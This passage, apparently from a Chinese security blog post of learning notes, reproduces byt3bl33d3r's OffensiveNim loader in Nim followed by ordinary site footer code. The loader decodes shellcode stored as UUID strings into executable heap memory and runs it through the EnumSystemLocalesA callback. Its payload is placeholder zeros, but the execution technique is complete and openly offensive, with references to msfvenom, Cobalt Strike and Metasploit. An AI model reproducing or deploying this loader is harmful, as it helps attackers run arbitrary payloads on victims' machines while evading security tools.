+<h3 id="byt3bl33d3r-OffensiveNim-uuid-exec-bin-nim"><a href="#byt3bl33d3r-OffensiveNim-uuid-exec-bin-nim" class="headerlink" title="byt3bl33d3r&#x2F;OffensiveNim&#x2F;uuid_exec_bin.nim"></a>byt3bl33d3r&#x2F;OffensiveNim&#x2F;uuid_exec_bin.nim</h3><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/byt3bl33d3r/OffensiveNim/refs/heads/master/src/uuid_exec_bin.nim">传送门</a></p>
+<h4 id="ShellCode执行器-3"><a href="#ShellCode执行器-3" class="headerlink" title="ShellCode执行器"></a>ShellCode执行器</h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> winim</span><br><span class="line"><span class="keyword">import</span> strformat</span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> defined(amd64):</span><br><span class="line">        echo <span class="string">&quot;[*] Running in x64 Process&quot;</span></span><br><span class="line">        <span class="comment"># msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread</span></span><br><span class="line">        <span class="keyword">const</span> <span class="type">SIZE</span> = <span class="number">18</span>  </span><br><span class="line">        <span class="keyword">var</span> <span class="type">UUIDARR</span> = allocCStringArray([ </span><br><span class="line">            <span class="string">&quot;00000000-0000-0000-0000-000000000000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;00000000-0000-0000-0000-000000000000&quot;</span> ])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> isMainModule:</span><br><span class="line">        echo <span class="string">fmt&quot;[*] Allocating Heap Memory&quot;</span></span><br><span class="line">        <span class="keyword">let</span> hHeap = <span class="type">HeapCreate</span>(<span class="type">HEAP_CREATE_ENABLE_EXECUTE</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">let</span> ha = <span class="type">HeapAlloc</span>(hHeap, <span class="number">0</span>, <span class="number">0x100000</span>)</span><br><span class="line">        <span class="keyword">var</span> hptr = <span class="keyword">cast</span>[<span class="type">DWORD_PTR</span>](ha)</span><br><span class="line">        <span class="keyword">if</span> hptr != <span class="number">0</span>:</span><br><span class="line">            echo <span class="string">fmt&quot;[+] Heap Memory is Allocated at 0x&#123;hptr.toHex&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            echo <span class="string">fmt&quot;[-] Heap Alloc Error &quot;</span></span><br><span class="line">            quit(<span class="type">QuitFailure</span>)</span><br><span class="line"></span><br><span class="line">        echo <span class="string">fmt&quot;[*] UUID Array size is &#123;SIZE&#125;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..(<span class="type">SIZE</span>-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">var</span> status = <span class="type">UuidFromStringA</span>(<span class="keyword">cast</span>[<span class="type">RPC_CSTR</span>](<span class="type">UUIDARR</span>[i]), <span class="keyword">cast</span>[<span class="keyword">ptr</span> <span class="type">UUID</span>](hptr))</span><br><span class="line">            <span class="keyword">if</span> status != <span class="type">RPC_S_OK</span>:</span><br><span class="line">                <span class="keyword">if</span> status == <span class="type">RPC_S_INVALID_STRING_UUID</span>:</span><br><span class="line">                    echo <span class="string">fmt&quot;[-] Invalid UUID String Detected&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    echo <span class="string">fmt&quot;[-] Something Went Wrong, Error Code: &#123;status&#125;&quot;</span></span><br><span class="line">                quit(<span class="type">QuitFailure</span>)</span><br><span class="line">            hptr += <span class="number">16</span></span><br><span class="line">        echo <span class="string">fmt&quot;[+] Shellcode is successfully placed between 0x&#123;(cast[DWORD_PTR](ha)).toHex&#125; and 0x&#123;hptr.toHex&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        echo <span class="string">fmt&quot;[*] Calling the Callback Function ...&quot;</span> </span><br><span class="line">        <span class="type">EnumSystemLocalesA</span>(<span class="keyword">cast</span>[<span class="type">LOCALE_ENUMPROCA</span>](ha), <span class="number">0</span>)</span><br><span class="line">        <span class="type">CloseHandle</span>(hHeap)</span><br><span class="line">        quit(<span class="type">QuitSuccess</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1536">奇安信攻防社区——Macchiato</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
+  <button>
+    储钱罐
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/dist/images/reward/images/wxpay.png" alt="绯鞠 微信支付">
+        <span>微信支付</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/alipay.png" alt="绯鞠 支付宝">
+        <span>支付宝</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/qqpay.png" alt="绯鞠 qqpay">
+        <span>qqpay</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/bitcoin.png" alt="绯鞠 比特币">
+        <span>比特币</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/ethereum.png" alt="绯鞠 ethereum">
+        <span>ethereum</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/monero.png" alt="绯鞠 monero">
+        <span>monero</span>
+      </div>
+      <div>
+        <img src="/dist/images/reward/images/paypal.png" alt="绯鞠 贝宝">
+        <span>贝宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CobaltStrike/" rel="tag"># CobaltStrike</a>
+              <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/10/Windows%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/" rel="prev" title="【笔记】Windows环境变量全局变量">
+                  <i class="fa fa-angle-left"></i> 【笔记】Windows环境变量全局变量
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/08/14/ShellcodeWrapper%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="【笔记】ShellcodeWrapper学习笔记">
+                  【笔记】ShellcodeWrapper学习笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments"><div id="twikoo-comments"></div></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">绯鞠</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div><!-- 当前在线人数统计 -->
+<div>当前在线人数 <span id="current_visitors_count">0</span></div>
+<script src="/dist/js/current_visitors_count.js"></script>
+
+<!-- 网站运行时间统计 -->
+<div id="sitetime"></div>
+<script type="text/javascript" src="/dist/js/sitetime.js"></script>
+
+<!-- 网站标记 -->
+<div>
+    <!-- SSL标记 -->
+    <a href="https://ipw.cn/ssl/?site=loli.fj.cn" title="本站支持SSL安全访问" target='_blank'
+       style="display: inline; border-bottom: 1px solid rgba(255, 255, 255, 0);"><img
+                style='display:inline-block;vertical-align:middle' alt="本站支持SSL安全访问"
+                src="https://static.ipw.cn/icon/ssl-s6.svg"></a>
+    <!-- IPv6标记 -->
+    <a href="https://ipw.cn/ipv6webcheck/?site=loli.fj.cn" title="本站支持IPv6访问" target='_blank'
+       style="display: inline; border-bottom: 1px solid rgba(255, 255, 255, 0);"><img
+                style='display:inline-block;vertical-align:middle' alt="本站支持IPv6访问"
+                src="https://static.ipw.cn/icon/ipv6-certified-s6.svg"></a>
+</div>
+
+<!-- 滑翔机 -->
+<a target="_blank" rel="noopener" href="http://www.catb.org/hacker-emblem/" style="border-bottom: 0 solid #999;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Glider.svg" style="width: 55px; height: 55px;">
+</a>
+
+<!-- 加载APlayer播放器 -->
+<link rel="stylesheet" href="/dist/aplayer/APlayer.min.css">
+<script type="text/javascript" src="/dist/aplayer/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/aplayer/index.js"></script>
+
+<!-- 加载看板娘 必须在渲染APlayer播放器之后渲染 -->
+<link rel="stylesheet" href="/dist/live2d/v2/waifu.css">
+<script type="text/javascript" src="/dist/live2d/v2/live2d.min.js"></script>
+<script type="text/javascript" src="/dist/live2d/v2/waifu.js"></script>
+
+<!-- 加载钢琴音 -->
+<script type="text/javascript" src="/dist/js/play_piano.js"></script>
+
+<!-- 渲染分类页面 PJAX排除 -->
+<script type="text/javascript" src="/categories/index.js" data-pjax=""></script>
+
+<!-- 渲染标签页面 PJAX排除 -->
+<script type="text/javascript" src="/tags/index.js" data-pjax=""></script>
+
+<!-- 渲染贡献页面 PJAX排除 -->
+<script type="text/javascript" src="/dist/echarts5/echarts.min.js"></script>
+<script type="text/javascript" src="/contribute/index.js" data-pjax=""></script>
+
+<!-- 渲染代码块中代码类型 PJAX排除 -->
+<script type="text/javascript" src="/dist/js/code_block_type.js" data-pjax=""></script>
+
+<!-- 渲染代码块顶部按钮 PJAX排除 -->
+<script type="text/javascript" src="/dist/js/code_block_button.js" data-pjax=""></script>
+
+<!-- 渲染打字机效果 PJAX排除 -->
+<script type="text/javascript" src="/dist/js/ai_excerpt_typing.js" data-pjax=""></script>
+
+<!-- 渲染加载门 -->
+<div id="loading-door-left"></div>
+<div id="loading-door-right"></div>
+<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>
+<link rel="stylesheet" href="/dist/css/loading_door.css">
+
+<!-- 其他JS代码 -->
+<script>
+
+    // 移除PJAX
+    function removePJAX() {
+        // 获取所有菜单的超链接
+        let menus = document.querySelectorAll(".site-nav a");
+        // 遍历这些超链接对象
+        for (let menu of menus) {
+            // 移除首页的PJAX
+            // if (menu.getAttribute("href")==="/") {
+            //     menu.setAttribute("data-pjax-state", "unload");
+            // }
+        }
+    }
+    removePJAX();
+
+    // 加载门关闭
+    function loadingDoorClose() {
+        // 加载门关闭
+        document.getElementById("loading-door-left").style.width = `${window.innerWidth / 2}px`;
+        document.getElementById("loading-door-right").style.width = `${window.innerWidth / 2}px`;
+        // 锁定滚动条
+        document.body.style.overflow = "hidden";
+        // 显示咒语
+        setTimeout(function () {
+            if (document.getElementById("loading-door-left").style.width === `${window.innerWidth / 2}px`) {
+                document.getElementById("loading-door-a").style.display = "inline";
+            }
+        }, 3000);
+    }
+
+    // 加载门打开
+    function loadingDoorOpen() {
+        // 加载门打开
+        document.getElementById("loading-door-left").style.width = "0";
+        document.getElementById("loading-door-right").style.width = "0";
+        // 解锁滚动条
+        document.body.style.overflow = "";
+        // 隐藏咒语
+        document.getElementById("loading-door-a").style.display = "none";
+    }
+
+    // PJAX渲染完成后执行
+    document.addEventListener("pjax:success", function () {
+        // 将滚动条置顶
+        document.documentElement.scrollTop = 0;
+        // 移除PJAX
+        removePJAX();
+    });
+
+    // PJAX开始请求后执行
+    document.addEventListener("pjax:send", function () {
+        // 加载门关闭
+        loadingDoorClose();
+    });
+    // PJAX结束请求后执行
+    document.addEventListener("pjax:complete", function () {
+        // 加载门打开
+        loadingDoorOpen();
+    });
+
+</script>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
+  <script src="/lib/pangu/dist/browser/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"/lib/mermaid/dist/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"/dist/js/twikoo.all.min.js","el":"#twikoo-comments"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.twikoo.el)
+    .then(() => NexT.utils.getScript(
+      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
+      { condition: window.twikoo }
+    ))
+    .then(() => {
+      twikoo.init(CONFIG.twikoo);
+    });
+});
+</script>
+<style>
+.post-block, .comments {
+  overflow: visible;
+}
+.tk-owo-emotion {
+  display: inline-block;
+}
+</style>
+
+</body>
+</html>
